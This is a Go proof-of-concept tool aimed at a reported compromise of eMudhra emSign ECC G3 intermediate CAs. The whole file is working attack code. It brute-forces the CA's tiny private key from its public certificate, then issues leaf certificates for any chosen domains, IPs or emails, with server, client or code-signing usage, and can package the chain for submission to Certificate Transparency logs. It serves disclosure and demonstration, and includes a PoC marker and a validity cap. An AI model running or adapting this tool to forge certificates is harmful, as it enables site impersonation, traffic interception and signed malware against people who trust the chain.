// Command emudhra-poc demonstrates the eMudhra emSign ECC G3 intermediate key
// compromise (Mozilla bug 2083449): the CA private keys are tiny scalars, so
// anyone can recover them from the public CA certificate and issue leaf
// certificates that chain to the (now revoked/distrusted) intermediates.
//
// Every issued certificate is marked as a proof of concept and limited to a
// short validity period.
package main

import (
	"bytes"
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

const (
	pocMarker        = "PoC"
	maxValidity      = 7 * 24 * time.Hour
	defaultMaxScalar = 1 << 16
)

type Config struct {
	CACert    string       `json:"ca_cert"`              // PEM of the compromised intermediate
	CAKey     string       `json:"ca_key,omitempty"`     // optional; recovered from ca_cert if empty
	RootCert  string       `json:"root_cert,omitempty"`  // optional trust anchor for chain verification
	MaxScalar uint64       `json:"max_scalar,omitempty"` // brute-force bound for key recovery
	Leaf      LeafConfig   `json:"leaf"`
	Output    OutputConfig `json:"output"`
}

type LeafConfig struct {
	CommonName            string   `json:"common_name"`
	DNSNames              []string `json:"dns_names,omitempty"`
	IPAddresses           []string `json:"ip_addresses,omitempty"`
	EmailAddresses        []string `json:"email_addresses,omitempty"`
	URIs                  []string `json:"uris,omitempty"`
	Organization          []string `json:"organization,omitempty"`
	OrganizationalUnit    []string `json:"organizational_unit,omitempty"`
	Country               []string `json:"country,omitempty"`
	ValidityHours         int      `json:"validity_hours,omitempty"`
	KeyType               string   `json:"key_type,omitempty"`      // ecdsa-p256 | ecdsa-p384 | rsa-2048 | rsa-3072
	ExtKeyUsage           []string `json:"ext_key_usage,omitempty"` // serverAuth | clientAuth | codeSigning | emailProtection
	PolicyOIDs            []string `json:"policy_oids,omitempty"`
	CRLDistributionPoints []string `json:"crl_distribution_points,omitempty"`
	OCSPServer            []string `json:"ocsp_server,omitempty"`
	IssuingCertificateURL []string `json:"issuing_certificate_url,omitempty"`
}

type OutputConfig struct {
	Cert  string `json:"cert"`
	Key   string `json:"key"`
	Chain string `json:"chain,omitempty"`
}

type issued struct {
	ca      *x509.Certificate
	root    *x509.Certificate
	scalar  uint64 // 0 if the CA key was loaded from a file
	leaf    *x509.Certificate
	leafKey crypto.Signer
}

type runOptions struct {
	show  bool      // print only the certificate; no files, no checks
	chain bool      // also print the complete chain as PEM
	json  bool      // print the chain as an RFC 6962 add-chain request instead of PEM
	diag  io.Writer // receives details and checks when json is set; nil discards them
}

// addChainRequest is the body of an RFC 6962 POST /ct/v1/add-chain request.
// []byte fields marshal as standard base64, i.e. base64-encoded DER.
type addChainRequest struct {
	Chain [][]byte `json:"chain"`
}

// sanFlag collects -san values. Each value may be comma-separated and
// optionally prefixed with DNS:, IP:, email: or URI:; otherwise the type is
// inferred.
type sanFlag []string

func (s *sanFlag) String() string { return strings.Join(*s, ",") }

func (s *sanFlag) Set(v string) error {
	for _, part := range strings.Split(v, ",") {
		if part = strings.TrimSpace(part); part != "" {
			*s = append(*s, part)
		}
	}
	return nil
}

func main() {
	var sans sanFlag
	configPath := flag.String("config", "config.json", "path to JSON config")
	show := flag.Bool("show", false, "only generate and print the certificate PEM; write no files and skip checks")
	chain := flag.Bool("chain", false, "also print the complete chain (leaf, CA, root if configured) as PEM")
	jsonOut := flag.Bool("json", false, "print the complete chain as a CT add-chain JSON request on stdout; details and checks go to stderr")
	flag.Var(&sans, "san", "subject alternative name, repeatable or comma-separated (e.g. -san a.example,IP:192.0.2.1); replaces SANs from the config")
	flag.Parse()

	cfg, err := loadConfig(*configPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
	if len(sans) > 0 {
		if err := applySANs(&cfg.Leaf, sans); err != nil {
			fmt.Fprintln(os.Stderr, "error:", err)
			os.Exit(1)
		}
	}
	opts := runOptions{show: *show, chain: *chain, json: *jsonOut, diag: os.Stderr}
	if err := run(cfg, opts, os.Stdout); err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
}

func loadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	cfg := &Config{}
	dec := json.NewDecoder(bytes.NewReader(data))
	dec.DisallowUnknownFields()
	if err := dec.Decode(cfg); err != nil {
		return nil, fmt.Errorf("parse %s: %w", path, err)
	}

	// Relative paths in the config are relative to the config file.
	base := filepath.Dir(path)
	for _, p := range []*string{&cfg.CACert, &cfg.CAKey, &cfg.RootCert, &cfg.Output.Cert, &cfg.Output.Key, &cfg.Output.Chain} {
		if *p != "" && !filepath.IsAbs(*p) {
			*p = filepath.Join(base, *p)
		}
	}
	return cfg, nil
}

// applySANs replaces the SANs in lc with the given CLI values.
func applySANs(lc *LeafConfig, sans []string) error {
	lc.DNSNames, lc.IPAddresses, lc.EmailAddresses, lc.URIs = nil, nil, nil, nil
	for _, san := range sans {
		kind, value, ok := strings.Cut(san, ":")
		if !ok || net.ParseIP(san) != nil || strings.Contains(san, "://") && !strings.EqualFold(kind, "URI") {
			kind, value = "", san
		}
		switch strings.ToUpper(kind) {
		case "DNS":
			lc.DNSNames = append(lc.DNSNames, value)
		case "IP":
			lc.IPAddresses = append(lc.IPAddresses, value)
		case "EMAIL":
			lc.EmailAddresses = append(lc.EmailAddresses, value)
		case "URI":
			lc.URIs = append(lc.URIs, value)
		case "":
			switch {
			case net.ParseIP(value) != nil:
				lc.IPAddresses = append(lc.IPAddresses, value)
			case strings.Contains(value, "://"):
				lc.URIs = append(lc.URIs, value)
			case strings.Contains(value, "@"):
				lc.EmailAddresses = append(lc.EmailAddresses, value)
			default:
				lc.DNSNames = append(lc.DNSNames, value)
			}
		default:
			return fmt.Errorf("unknown SAN type %q in %q (use DNS:, IP:, email: or URI:)", kind, san)
		}
	}
	return nil
}

func run(cfg *Config, opts runOptions, w io.Writer) error {
	if cfg.CACert == "" {
		return errors.New("ca_cert is required")
	}
	lc := &cfg.Leaf
	if lc.CommonName == "" && len(lc.DNSNames)+len(lc.IPAddresses)+len(lc.EmailAddresses)+len(lc.URIs) == 0 {
		return errors.New("leaf.common_name or at least one SAN is required")
	}

	res, err := issue(cfg)
	if err != nil {
		return err
	}

	leafPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: res.leaf.Raw})

	if opts.show {
		switch {
		case opts.json:
			return writeAddChain(w, res)
		case opts.chain:
			writeChain(w, res)
		default:
			w.Write(leafPEM)
		}
		return nil
	}

	if err := writeOutputs(cfg, res, leafPEM); err != nil {
		return err
	}

	// With -json, stdout stays pure JSON so it can be piped to a CT log.
	text := w
	if opts.json {
		text = opts.diag
		if text == nil {
			text = io.Discard
		}
	}

	describe(text, "Issuing CA", res.ca)
	if res.scalar != 0 {
		fmt.Fprintf(text, "  Recovered key:  d = %d\n", res.scalar)
	}
	fmt.Fprintln(text)
	describe(text, "Leaf certificate", res.leaf)
	fmt.Fprintln(text)

	if !check(text, cfg, res) {
		return errors.New("one or more checks failed")
	}
	if opts.json {
		return writeAddChain(w, res)
	}
	if opts.chain {
		fmt.Fprintln(w)
		writeChain(w, res)
	}
	return nil
}

// chainCerts returns leaf, issuing CA and (if configured) root.
func chainCerts(res *issued) []*x509.Certificate {
	certs := []*x509.Certificate{res.leaf, res.ca}
	if res.root != nil {
		certs = append(certs, res.root)
	}
	return certs
}

// writeChain prints the complete chain as PEM.
func writeChain(w io.Writer, res *issued) {
	for _, c := range chainCerts(res) {
		pem.Encode(w, &pem.Block{Type: "CERTIFICATE", Bytes: c.Raw})
	}
}

// writeAddChain prints the complete chain as an RFC 6962 add-chain request.
func writeAddChain(w io.Writer, res *issued) error {
	var req addChainRequest
	for _, c := range chainCerts(res) {
		req.Chain = append(req.Chain, c.Raw)
	}
	return json.NewEncoder(w).Encode(req)
}

func issue(cfg *Config) (*issued, error) {
	ca, err := readCert(cfg.CACert)
	if err != nil {
		return nil, fmt.Errorf("ca_cert: %w", err)
	}
	caPub, ok := ca.PublicKey.(*ecdsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("ca_cert: expected ECDSA public key, got %T", ca.PublicKey)
	}

	res := &issued{ca: ca}
	var caKey *ecdsa.PrivateKey
	if cfg.CAKey != "" {
		caKey, err = readECKey(cfg.CAKey)
		if err != nil {
			return nil, fmt.Errorf("ca_key: %w", err)
		}
	} else {
		max := cfg.MaxScalar
		if max == 0 {
			max = defaultMaxScalar
		}
		caKey, res.scalar, err = recoverScalar(caPub, max)
		if err != nil {
			return nil, err
		}
	}
	if !caKey.PublicKey.Equal(caPub) {
		return nil, errors.New("CA private key does not match CA certificate")
	}

	if cfg.RootCert != "" {
		if res.root, err = readCert(cfg.RootCert); err != nil {
			return nil, fmt.Errorf("root_cert: %w", err)
		}
	}

	res.leafKey, err = generateKey(cfg.Leaf.KeyType)
	if err != nil {
		return nil, err
	}
	tmpl, err := leafTemplate(&cfg.Leaf, res.leafKey)
	if err != nil {
		return nil, err
	}

	der, err := x509.CreateCertificate(rand.Reader, tmpl, ca, res.leafKey.Public(), caKey)
	if err != nil {
		return nil, fmt.Errorf("sign leaf: %w", err)
	}
	if res.leaf, err = x509.ParseCertificate(der); err != nil {
		return nil, fmt.Errorf("parse issued leaf: %w", err)
	}
	return res, nil
}

// recoverScalar finds d in [1, max] such that d*G equals pub.
func recoverScalar(pub *ecdsa.PublicKey, max uint64) (*ecdsa.PrivateKey, uint64, error) {
	buf := make([]byte, (pub.Curve.Params().BitSize+7)/8)
	for d := uint64(1); d <= max; d++ {
		binary.BigEndian.PutUint64(buf[len(buf)-8:], d)
		k, err := ecdsa.ParseRawPrivateKey(pub.Curve, buf)
		if err != nil {
			return nil, 0, err
		}
		if k.PublicKey.Equal(pub) {
			return k, d, nil
		}
	}
	return nil, 0, fmt.Errorf("no private scalar <= %d matches the CA public key", max)
}

func leafTemplate(lc *LeafConfig, key crypto.Signer) (*x509.Certificate, error) {
	validity := 24 * time.Hour
	if lc.ValidityHours > 0 {
		validity = time.Duration(lc.ValidityHours) * time.Hour
	}
	if validity > maxValidity {
		return nil, fmt.Errorf("validity_hours %d exceeds PoC limit of %d", lc.ValidityHours, int(maxValidity.Hours()))
	}

	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 127))
	if err != nil {
		return nil, err
	}

	cn := lc.CommonName
	if cn == "" {
		for _, names := range [][]string{lc.DNSNames, lc.IPAddresses, lc.EmailAddresses} {
			if len(names) > 0 {
				cn = names[0]
				break
			}
		}
	}
	now := time.Now()
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName:         cn,
			Organization:       lc.Organization,
			OrganizationalUnit: append(append([]string{}, lc.OrganizationalUnit...), pocMarker),
			Country:            lc.Country,
		},
		NotBefore:             now.Add(-5 * time.Minute),
		NotAfter:              now.Add(validity),
		KeyUsage:              x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
		DNSNames:              lc.DNSNames,
		EmailAddresses:        lc.EmailAddresses,
		CRLDistributionPoints: lc.CRLDistributionPoints,
		OCSPServer:            lc.OCSPServer,
		IssuingCertificateURL: lc.IssuingCertificateURL,
	}
	if _, ok := key.(*rsa.PrivateKey); ok {
		tmpl.KeyUsage |= x509.KeyUsageKeyEncipherment
	}

	for _, s := range lc.IPAddresses {
		ip := net.ParseIP(s)
		if ip == nil {
			return nil, fmt.Errorf("invalid ip address %q", s)
		}
		tmpl.IPAddresses = append(tmpl.IPAddresses, ip)
	}
	for _, s := range lc.URIs {
		u, err := url.Parse(s)
		if err != nil || u.Scheme == "" {
			return nil, fmt.Errorf("invalid uri %q", s)
		}
		tmpl.URIs = append(tmpl.URIs, u)
	}

	ekus := lc.ExtKeyUsage
	if len(ekus) == 0 {
		ekus = []string{"serverAuth"}
	}
	for _, name := range ekus {
		eku, ok := extKeyUsages[name]
		if !ok {
			return nil, fmt.Errorf("unknown ext_key_usage %q", name)
		}
		tmpl.ExtKeyUsage = append(tmpl.ExtKeyUsage, eku)
	}

	for _, s := range lc.PolicyOIDs {
		oid, err := parseOID(s)
		if err != nil {
			return nil, err
		}
		tmpl.PolicyIdentifiers = append(tmpl.PolicyIdentifiers, oid)
	}
	return tmpl, nil
}

var extKeyUsages = map[string]x509.ExtKeyUsage{
	"serverAuth":      x509.ExtKeyUsageServerAuth,
	"clientAuth":      x509.ExtKeyUsageClientAuth,
	"codeSigning":     x509.ExtKeyUsageCodeSigning,
	"emailProtection": x509.ExtKeyUsageEmailProtection,
}

func generateKey(keyType string) (crypto.Signer, error) {
	switch keyType {
	case "", "ecdsa-p256":
		return ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	case "ecdsa-p384":
		return ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
	case "rsa-2048":
		return rsa.GenerateKey(rand.Reader, 2048)
	case "rsa-3072":
		return rsa.GenerateKey(rand.Reader, 3072)
	}
	return nil, fmt.Errorf("unknown key_type %q", keyType)
}

func check(w io.Writer, cfg *Config, res *issued) bool {
	ok := true
	report := func(name string, err error) {
		if err != nil {
			ok = false
			fmt.Fprintf(w, "  [FAIL] %s: %v\n", name, err)
			return
		}
		fmt.Fprintf(w, "  [ OK ] %s\n", name)
	}

	fmt.Fprintln(w, "Checks")
	report("leaf signature verifies under CA public key", res.leaf.CheckSignatureFrom(res.ca))
	report("leaf certificate matches generated leaf key", func() error {
		if !publicKeysEqual(res.leaf.PublicKey, res.leafKey.Public()) {
			return errors.New("public key mismatch")
		}
		return nil
	}())
	report("leaf authority key ID matches CA subject key ID", func() error {
		if !bytes.Equal(res.leaf.AuthorityKeyId, res.ca.SubjectKeyId) {
			return fmt.Errorf("AKI %x != SKI %x", res.leaf.AuthorityKeyId, res.ca.SubjectKeyId)
		}
		return nil
	}())

	roots, inters := x509.NewCertPool(), x509.NewCertPool()
	anchor := "CA certificate (intermediate used as trust anchor, offline)"
	if res.root != nil {
		roots.AddCert(res.root)
		inters.AddCert(res.ca)
		anchor = "root " + res.root.Subject.CommonName
	} else {
		roots.AddCert(res.ca)
	}
	opts := x509.VerifyOptions{
		Roots:         roots,
		Intermediates: inters,
		KeyUsages:     res.leaf.ExtKeyUsage,
	}
	if len(res.leaf.DNSNames) > 0 {
		opts.DNSName = res.leaf.DNSNames[0]
	}
	chains, err := res.leaf.Verify(opts)
	report("chain verification against "+anchor, err)
	for _, chain := range chains {
		names := make([]string, len(chain))
		for i, c := range chain {
			names[i] = c.Subject.CommonName
		}
		fmt.Fprintf(w, "         chain: %s\n", strings.Join(names, " -> "))
	}

	fmt.Fprintln(w)
	fmt.Fprintln(w, "Output")
	fmt.Fprintf(w, "  cert:  %s\n  key:   %s\n", cfg.Output.Cert, cfg.Output.Key)
	if cfg.Output.Chain != "" {
		fmt.Fprintf(w, "  chain: %s\n", cfg.Output.Chain)
	}
	fmt.Fprintln(w, "\nNote: the issuing CA was revoked with reason caCompromise; revocation-checking clients should reject this chain.")
	return ok
}

func describe(w io.Writer, title string, c *x509.Certificate) {
	fp := sha256.Sum256(c.Raw)
	fmt.Fprintln(w, title)
	fmt.Fprintf(w, "  Subject:        %s\n", c.Subject)
	fmt.Fprintf(w, "  Issuer:         %s\n", c.Issuer)
	fmt.Fprintf(w, "  Serial:         %s\n", hex.EncodeToString(c.SerialNumber.Bytes()))
	fmt.Fprintf(w, "  Not before:     %s\n", c.NotBefore.UTC().Format(time.RFC3339))
	fmt.Fprintf(w, "  Not after:      %s\n", c.NotAfter.UTC().Format(time.RFC3339))
	fmt.Fprintf(w, "  Public key:     %s\n", keyDescription(c.PublicKey))
	fmt.Fprintf(w, "  Signature alg:  %s\n", c.SignatureAlgorithm)
	fmt.Fprintf(w, "  CA:             %t\n", c.IsCA)
	fmt.Fprintf(w, "  Key usage:      %s\n", strings.Join(keyUsageNames(c.KeyUsage), ", "))
	if len(c.ExtKeyUsage) > 0 {
		names := make([]string, len(c.ExtKeyUsage))
		for i, u := range c.ExtKeyUsage {
			names[i] = extKeyUsageName(u)
		}
		fmt.Fprintf(w, "  Ext key usage:  %s\n", strings.Join(names, ", "))
	}
	if sans := subjectAltNames(c); len(sans) > 0 {
		fmt.Fprintf(w, "  SANs:           %s\n", strings.Join(sans, ", "))
	}
	for _, oid := range c.PolicyIdentifiers {
		fmt.Fprintf(w, "  Policy:         %s\n", oid)
	}
	if len(c.SubjectKeyId) > 0 {
		fmt.Fprintf(w, "  Subject key ID: %x\n", c.SubjectKeyId)
	}
	if len(c.AuthorityKeyId) > 0 {
		fmt.Fprintf(w, "  Auth key ID:    %x\n", c.AuthorityKeyId)
	}
	for _, u := range c.CRLDistributionPoints {
		fmt.Fprintf(w, "  CRL:            %s\n", u)
	}
	for _, u := range c.OCSPServer {
		fmt.Fprintf(w, "  OCSP:           %s\n", u)
	}
	for _, u := range c.IssuingCertificateURL {
		fmt.Fprintf(w, "  CA issuers:     %s\n", u)
	}
	fmt.Fprintf(w, "  SHA-256:        %s\n", strings.ToUpper(hex.EncodeToString(fp[:])))
}

func subjectAltNames(c *x509.Certificate) []string {
	var sans []string
	for _, n := range c.DNSNames {
		sans = append(sans, "DNS:"+n)
	}
	for _, ip := range c.IPAddresses {
		sans = append(sans, "IP:"+ip.String())
	}
	for _, e := range c.EmailAddresses {
		sans = append(sans, "email:"+e)
	}
	for _, u := range c.URIs {
		sans = append(sans, "URI:"+u.String())
	}
	return sans
}

func keyDescription(pub any) string {
	switch k := pub.(type) {
	case *ecdsa.PublicKey:
		return "ECDSA " + k.Curve.Params().Name
	case *rsa.PublicKey:
		return "RSA " + strconv.Itoa(k.N.BitLen())
	}
	return fmt.Sprintf("%T", pub)
}

func keyUsageNames(ku x509.KeyUsage) []string {
	names := []string{"digitalSignature", "contentCommitment", "keyEncipherment", "dataEncipherment",
		"keyAgreement", "keyCertSign", "cRLSign", "encipherOnly", "decipherOnly"}
	var out []string
	for i, n := range names {
		if ku&(1<<i) != 0 {
			out = append(out, n)
		}
	}
	return out
}

func extKeyUsageName(u x509.ExtKeyUsage) string {
	for name, v := range extKeyUsages {
		if v == u {
			return name
		}
	}
	return fmt.Sprintf("EKU(%d)", u)
}

func publicKeysEqual(a, b crypto.PublicKey) bool {
	ak, ok := a.(interface{ Equal(crypto.PublicKey) bool })
	return ok && ak.Equal(b)
}

func parseOID(s string) (asn1.ObjectIdentifier, error) {
	var oid asn1.ObjectIdentifier
	for _, part := range strings.Split(s, ".") {
		n, err := strconv.Atoi(part)
		if err != nil {
			return nil, fmt.Errorf("invalid policy oid %q", s)
		}
		oid = append(oid, n)
	}
	return oid, nil
}

func writeOutputs(cfg *Config, res *issued, leafPEM []byte) error {
	if cfg.Output.Cert == "" || cfg.Output.Key == "" {
		return errors.New("output.cert and output.key are required (or use -show)")
	}
	keyDER, err := x509.MarshalPKCS8PrivateKey(res.leafKey)
	if err != nil {
		return err
	}
	files := map[string][]byte{
		cfg.Output.Cert: leafPEM,
		cfg.Output.Key:  pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: keyDER}),
	}
	if cfg.Output.Chain != "" {
		files[cfg.Output.Chain] = append(append([]byte{}, leafPEM...),
			pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: res.ca.Raw})...)
	}
	for path, data := range files {
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			return err
		}
		mode := os.FileMode(0o644)
		if path == cfg.Output.Key {
			mode = 0o600
		}
		if err := os.WriteFile(path, data, mode); err != nil {
			return err
		}
	}
	return nil
}

func readCert(path string) (*x509.Certificate, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	block, _ := pem.Decode(data)
	if block == nil || block.Type != "CERTIFICATE" {
		return nil, errors.New("no CERTIFICATE PEM block found")
	}
	return x509.ParseCertificate(block.Bytes)
}

func readECKey(path string) (*ecdsa.PrivateKey, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	block, _ := pem.Decode(data)
	if block == nil {
		return nil, errors.New("no PEM block found")
	}
	switch block.Type {
	case "EC PRIVATE KEY":
		return x509.ParseECPrivateKey(block.Bytes)
	case "PRIVATE KEY":
		k, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err != nil {
			return nil, err
		}
		ec, ok := k.(*ecdsa.PrivateKey)
		if !ok {
			return nil, fmt.Errorf("expected ECDSA key, got %T", k)
		}
		return ec, nil
	}
	return nil, fmt.Errorf("unsupported PEM type %q", block.Type)
}
